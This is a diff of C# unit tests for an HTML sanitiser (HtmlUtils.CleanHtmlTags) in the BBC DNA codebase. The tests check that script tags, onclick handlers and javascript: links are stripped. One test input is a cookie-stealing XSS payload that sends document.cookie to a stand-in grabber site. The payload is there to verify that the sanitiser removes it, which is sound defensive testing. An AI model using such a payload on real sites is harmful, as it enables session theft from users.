@@ -279,23 +279,31 @@ namespace BBC.Dna.Utils.Tests
             foreach (string tag in badTags)
             {
                 string test = String.Format("this is a <{0}>test</{0}> for bad html tags.", tag);
-                string expected = String.Format("this is a test for bad html tags.", tag);
                 string result = HtmlUtils.CleanHtmlTags(test, false, false);
-                Assert.AreEqual(expected, result);//removed
+                Console.WriteLine(test);
+                Console.WriteLine(result);
+                Console.WriteLine("");
+                Assert.IsTrue(result.IndexOf("<" + tag + ">") < 0);//removed
+                Assert.IsTrue(result.IndexOf("</" + tag + ">") < 0);//removed
             }
 
             foreach (string tag in badTags)
             {
                 string test = String.Format("this is a <{0} onclick='hello'>test</{0}> for bad html tags.", tag);
-                string expected = String.Format("this is a test for bad html tags.", tag);
                 string result = HtmlUtils.CleanHtmlTags(test, false, false);
-                Assert.AreEqual(expected, result);//removed
+                Console.WriteLine(test);
+                Console.WriteLine(result);
+                Console.WriteLine("");
+                Assert.IsTrue(result.IndexOf("<" + tag + " onclick='hello'>") < 0);//removed
+                Assert.IsTrue(result.IndexOf("</" + tag + ">") < 0);//removed
             }
+
+
 
             string[] goodTags = { "blockquote", "br", "em", "li", "p", "pre", "q", "strong", "ul" };
             foreach (string tag in goodTags)
             {
-                string test = String.Format("this is a <{0}>test</{0}> for good html tags.", tag.ToUpper());
+                string test = String.Format("this is a <{0}>test</{0}> for good html tags.", tag);
 
                 string expected = test;
                 string result = HtmlUtils.CleanHtmlTags(test, false, false);
@@ -306,7 +314,7 @@ namespace BBC.Dna.Utils.Tests
             {// anything inside tags stripped
                 string test = String.Format("this is a <{0} onclick='dosomethign()'>test</{0}> for good html tags.", tag);
 
-                string expected = String.Format("this is a <{0}>test</{0}> for good html tags.", tag.ToUpper());
+                string expected = String.Format("this is a <{0}>test</{0}> for good html tags.", tag);
                 string result = HtmlUtils.CleanHtmlTags(test, false, false);
                 Assert.AreEqual(expected, result);//removed
             }
@@ -380,7 +388,7 @@ namespace BBC.Dna.Utils.Tests
             string test = String.Format("this is a <p onclick=\"window.location='http://www.somehackysite.tk/cookie_grabber.php?c=' + document.cookie\">test</p> for bad html tags.");
             string result = HtmlUtils.CleanHtmlTags(test, false, false);
 
-            Assert.AreEqual("this is a <P>test</P> for bad html tags.", result);//removed
+            Assert.AreEqual("this is a <p>test</p> for bad html tags.", result);//removed
             
         }
 
@@ -391,17 +399,62 @@ namespace BBC.Dna.Utils.Tests
         public void CleanHtmlTags_IncludesDnaTags_TagsPreserved()
         {
             string test = String.Format("this is a <smiley TYPE='***' H2G2='Smiley#***' /> for bad html tags.");
+            string expected = String.Format("this is a <smiley type='***' h2g2='Smiley#***'></smiley> for bad html tags.");
             string result = HtmlUtils.CleanHtmlTags(test, false, false);
 
-            Assert.AreEqual(test, result);//removed
+            Assert.AreEqual(expected, result);//removed
 
         }
 
         [TestMethod]
         public void CleanHtmlTags_IncludesMixedTags_TagsPreserved()
         {
-            var test = String.Format("this is a <smiley TYPE='***' H2G2='Smiley#***' /> for <p onclick=''>bad</p> html tags.");
-            var expected = String.Format("this is a <smiley TYPE='***' H2G2='Smiley#***' /> for <P>bad</P> html tags.");
+            var test = String.Format("this is a <smiley TYPE='***' H2G2='Smiley#***'/> for <p onclick=''>bad</p> html tags.");
+            var expected = String.Format("this is a <smiley type='***' h2g2='Smiley#***'></smiley> for <p>bad</p> html tags.");
+            var result = HtmlUtils.CleanHtmlTags(test, false, false);
+
+            Assert.AreEqual(expected, result);//removed
+
+        }
+
+        [TestMethod]
+        public void CleanHtmlTags_IncludesMixedGoodBadTags_TagsPreserved()
+        {
+            var test = String.Format("this is a <p><script>my scripttag</script> with stuff in it</p> html tags.");
+            var expected = String.Format("this is a <p> with stuff in it</p> html tags.");
+            var result = HtmlUtils.CleanHtmlTags(test, false, false);
+
+            Assert.AreEqual(expected, result);//removed
+
+        }
+
+        [TestMethod]
+        public void CleanHtmlTags_AnchorWithValidHref_TagsPreserved()
+        {
+            var test = String.Format("this is a <a href='http://www.bb.co.uk/'>my scripttag</a> html tags.");
+            var expected = String.Format("this is a <a href='http://www.bb.co.uk/'>my scripttag</a> html tags.");
+            var result = HtmlUtils.CleanHtmlTags(test, false, false);
+
+            Assert.AreEqual(expected, result);//removed
+
+        }
+
+        [TestMethod]
+        public void CleanHtmlTags_AnchorWithValidHrefAndOnclick_TagsPreservedOnClickRemoved()
+        {
+            var test = String.Format("this is a <a href='http://www.bb.co.uk/' onclick='dostuff();'>my scripttag</a> html tags.");
+            var expected = String.Format("this is a <a href='http://www.bb.co.uk/'>my scripttag</a> html tags.");
+            var result = HtmlUtils.CleanHtmlTags(test, false, false);
+
+            Assert.AreEqual(expected, result);//removed
+
+        }
+
+        [TestMethod]
+        public void CleanHtmlTags_AnchorWithValidJavascriptHref_TagsPreservedHrefStripped()
+        {
+            var test = String.Format("this is a <a href='javascript:dostuff();'>my scripttag</a> html tags.");
+            var expected = String.Format("this is a <a href='#'>my scripttag</a> html tags.");
             var result = HtmlUtils.CleanHtmlTags(test, false, false);
 
             Assert.AreEqual(expected, result);//removed
@@ -413,7 +466,7 @@ namespace BBC.Dna.Utils.Tests
         public void CleanHtmlTags_IncludesMixedTags2_TagsPreserved()
         {
             var test = String.Format("this is a <smiley TYPE='***' H2G2='Smiley#***' /> for <p onclick=''>bad</p> html <p>tags</p>.");
-            var expected = String.Format("this is a <smiley TYPE='***' H2G2='Smiley#***' /> for <P>bad</P> html <P>tags</P>.");
+            var expected = String.Format("this is a <smiley type='***' h2g2='Smiley#***'></smiley> for <p>bad</p> html <p>tags</p>.");
             var result = HtmlUtils.CleanHtmlTags(test, false, false);
 
             Assert.AreEqual(expected, result);//removed
@@ -423,8 +476,8 @@ namespace BBC.Dna.Utils.Tests
         [TestMethod]
         public void CleanHtmlTags_SelfClosingOKTags_TagsPreserved()
         {
-            var test = String.Format("this is a contains a self closing <br/><br /> tag.");
-            var expected = String.Format("this is a contains a self closing <BR/><BR/> tag.");
+            var test = String.Format("this is a contains a self closing <br/><br/> tag.");
+            var expected = String.Format("this is a contains a self closing <br><br> tag.");
             var result = HtmlUtils.CleanHtmlTags(test, false, false);
 
             Assert.AreEqual(expected, result);//removed
@@ -460,6 +513,33 @@ namespace BBC.Dna.Utils.Tests
 
             Assert.AreEqual(expected, HtmlUtils.ParseHtmlToXmlElement(testStr, nodeName).OuterXml);
         }
+
+        //[TestMethod]
+        //public void TryParseToValidHtml_ValidHtml_ReturnCorrectHtml()
+        //{
+        //    var test = "<b>my test</b> with valid stuff";
+        //    var expected = test;
+
+        //    Assert.AreEqual(expected, HtmlUtils.TryParseToValidHtml(test));
+        //}
+
+        //[TestMethod]
+        //public void TryParseToValidHtml_InvalidHtml_ReturnFixedHtml()
+        //{
+        //    var test = "<b>my test with valid stuff";
+        //    var expected = "<b>my test with valid stuff</b>";
+
+        //    Assert.AreEqual(expected, HtmlUtils.TryParseToValidHtml(test));
+        //}
+
+        //[TestMethod]
+        //public void TryParseToValidHtml_GreaterThanLessThanHtml_ReturnFixedHtml()
+        //{
+        //    var test = "1 > 0 < -1";
+        //    var expected = "1 > 0 < -1";
+
+        //    Assert.AreEqual(expected, HtmlUtils.TryParseToValidHtml(test));
+        //}
 
     }
 }
